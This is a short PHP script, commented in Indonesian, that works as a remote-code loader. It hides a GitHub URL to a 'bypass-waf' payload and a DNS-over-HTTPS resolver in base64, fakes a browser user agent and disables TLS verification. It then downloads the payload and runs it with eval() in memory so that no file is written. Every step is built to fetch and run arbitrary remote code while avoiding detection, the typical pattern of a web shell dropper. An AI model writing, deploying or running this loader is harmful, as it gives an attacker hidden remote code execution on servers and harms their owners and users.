<?php
// Menggunakan base64 untuk menyamarkan URL GitHub dan DoH
$u = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RlY29kZVVSSS9ieXBhc3Mtd2FmL3JlZnMvaGVhZHMvbWFpbi90aW55X3lhay50eHQ=');
$d = base64_decode('aHR0cHM6Ly9jbG91ZGZsYXJlLWRucy5jb20vZG5zLW91ZXJ5');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $u);

// Tambahkan User Agent agar terlihat seperti browser biasa
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

if (defined('CURLOPT_DOH_URL')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $d);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // Kurangi ketatnya verifikasi jika perlu
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

$res = curl_exec($ch);
curl_close($ch);

if ($res) {
    // Menghilangkan tag PHP jika ada sebelum dieksekusi
    $res = str_replace(['<?php', '?>', '<?'], '', $res);
    
    // Eksekusi langsung di memori tanpa membuat file fisik (0kb issue dihindari)
    eval($res);
} else {
    echo "Gagal mengambil data.";
}
?>
